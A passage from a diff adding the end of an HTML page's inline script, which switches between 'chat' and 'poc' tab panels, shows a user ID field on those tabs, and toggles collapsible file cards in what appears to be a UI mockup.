+  const topTitle = document.getElementById("topTitle");
+
+  function show(tab) {
+    navItems.forEach((n) => n.classList.toggle("active", n.dataset.tab === tab));
+    panels.forEach((p) => (p.hidden = p.dataset.panel !== tab));
+    topTitle.textContent = titles[tab];
+    // user_id field only shows on chat / poc (matches App.tsx)
+    fieldUser.style.display = (tab === "chat" || tab === "poc") ? "" : "none";
+  }
+
+  navItems.forEach((n) => n.addEventListener("click", () => show(n.dataset.tab)));
+
+  // Collapsible file cards (poc) — toggle chevron + body visibility for realism
+  document.querySelectorAll(".file-card-head").forEach((head) => {
+    head.addEventListener("click", () => {
+      const body = head.parentElement.querySelector(".file-card-body");
+      const chevron = head.querySelector(".file-card-chevron");
+      if (!body) return;
+      const open = body.style.display !== "none";
+      body.style.display = open ? "none" : "";
+      chevron.textContent = open ? "▸" : "▾";
+    });
+  });
+
+  show("chat");
+</script>
+</body>
+</html>
